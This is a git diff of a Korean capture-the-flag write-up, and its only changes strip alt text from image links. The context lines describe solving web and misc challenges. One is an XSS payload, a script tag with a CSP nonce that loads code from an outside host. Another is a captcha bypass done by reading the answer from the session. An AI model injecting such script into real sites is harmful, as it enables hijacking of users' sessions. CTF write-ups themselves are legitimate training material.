@@ -433,7 +433,7 @@ app.listen(3000, '0.0.0.0', () => {
 ```
 
 그리고, `<script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44' </script>`를 `content`에 넣고 `post`하면 된다.
-![img2](img2.png)
+![](img2.png)
 `flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}`
 
 ## Misc
@@ -442,7 +442,7 @@ app.listen(3000, '0.0.0.0', () => {
 
 사이트에 들어가면, 미로가 있다.
 
-![img3](img3.png)
+![](img3.png)
 
 대충 `solver`를 만들어서 풀어보았다. (온라인에서 적절한 코드 하나 가져와서, chatgpt 돌려주면 된다. ~~물론 직접 코드를 작성해도 된다.~~)
 
@@ -565,7 +565,7 @@ parseMaze()
 
 사이트에 들어가면, 아래와 같이 `captcha`가 나온다. `captcha` 이미지 자체는 `ocr`로 읽어오기 쉽다. (근데, 혹시 그런 문제가 나왔을까 해서, session 값을 확인해보니 `captcha_text`가 존재한다.)
 
-![img4](img4.png)
+![](img4.png)
 
 그러면 이를 이용해 `captcha`를 우회할 수 있다. ~~오늘 대체적으로 코드가 더러운데, redirect 될 때의 쿠키 값 처리를 이상하게 해두었다...~~
 
@@ -619,7 +619,7 @@ for (let i = 0; i < 31; i++) {
 
 위 코드를 돌려주면, 10초 이내에 `flag`가 나온다.
 
-![img6](img6.png)
+![](img6.png)
 
 근데, 이걸 손으로 푼 팀이 있다고 해서 놀랐다....
 
